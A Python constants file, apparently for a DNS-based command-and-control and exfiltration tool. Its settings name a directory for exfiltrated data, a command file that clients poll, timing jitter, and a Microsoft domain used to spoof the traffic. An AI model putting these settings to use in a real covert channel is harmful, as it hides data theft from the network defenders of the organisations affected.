"""App constants"""

from collections import namedtuple

# Help Messages
HELP_CONFIG_PATH = 'Path to custom *.ini file containing config server/client settings.'

DEFAULT_CONFIG_PATH = 'config.ini'

# Misc
BROADCAST_MAC = '00:00:00:00:00:00'
LOG_DATA = True
PKT_CONF = {
    'DNS': {
        'type': 'TXT',
        'rclass': 'IN',
        'ttl': 700
    },
    'IP': {
        'ttl': 128,
        'version': 4
    }
}
SECRET = 'secret'

# Defaults for Server
DEFAULT_SERVER_INTERFACE = 'ens0'
DEFAULT_DATA_DIR = '/data/' # Storage of exfiltrated data
DEFAULT_CMD_FILE = 'cmd.txt'
DEFAULT_SECRET = 'secret' # Used for encrypting payload
DEFAULT_TIMEOUT = '60' # Default timeout of sending out packets 
DEFAULT_TIMEOUT_OFFSET = '20' # The +/- amount to vary up the timeoffsets
DEFAULT_FILTER = 'udp'

# Defaults for Client
DEFAULT_CLIENT_PING_INTERVAL = '60' # Measured in minutes for checking commands on server
DEFAULT_CLIENT_DOMAIN = 'cp501-prod.do.dsp.microsoft.com' # Domain to spoof requests with
DEFAULT_CLIENT_CNAME = 'cp501-prod.dodsp.mp.microsoft.com.nsatc.net'
DEFAULT_CLIENT_DATA_TRANSFER_INTERVAL = 1

# Config files
CONFIG_SERVER = 'SERVER'
CONFIG_CLIENT = 'CLIENT'
CONFIG_SERVER_KEYS = ['interface', 'data_dir', 'cmd_file', 'secret_key']
CONFIG_CLIENT_KEYS = ['client_ping_interval', 'client_domain', 'client_cname', 'client_data_transfer_interval']

# Types
ServerConf = namedtuple('ServerConf', ['interface', 'data_dir', 'cmd_file', 'secret_key', 'delay_time', 'delay_time_offset', 'domain', 'filter'])
ClientConf = namedtuple('ClientConf', ['client_ping_interval', 'client_domain', 'client_name'])
PacketData = namedtuple('PacketData', ['index', 'data'])

def default_server_conf():
    return ServerConf(
        interface=DEFAULT_SERVER_INTERFACE,
        data_dir=DEFAULT_DATA_DIR,
        cmd_file=DEFAULT_CMD_FILE,
        secret_key=DEFAULT_SECRET,
        delay_time=DEFAULT_TIMEOUT,
        delay_time_offset=DEFAULT_TIMEOUT_OFFSET,
        domain=DEFAULT_CLIENT_DOMAIN,
        filter=DEFAULT_FILTER
    )

def default_client_conf():
    return ClientConf(
        client_ping_interval=DEFAULT_CLIENT_PING_INTERVAL,
        client_domain=DEFAULT_CLIENT_DOMAIN,
        client_name=DEFAULT_CLIENT_CNAME
    )

def to_server_conf(conf):
    return ServerConf(
        interface=conf['interface'],
        data_dir=conf['data_dir'],
        cmd_file=conf['cmd_file'],
        secret_key=conf['secret_key'],
        delay_time=conf['delay_time'],
        delay_time_offset=conf['delay_time_offset'],
        domain=conf['domain'],
        filter=conf['filter']
    )

def to_client_conf(conf):
    return ClientConf(
        client_ping_interval=conf['client_ping_interval'],
        client_domain=conf['client_domain'],
        client_name=conf['client_name']
    )

# Logging for application
def log(class_name, function_name, message):
    if LOG_DATA:
        print('[{}]: ({}) - {}'.format(class_name, function_name, message))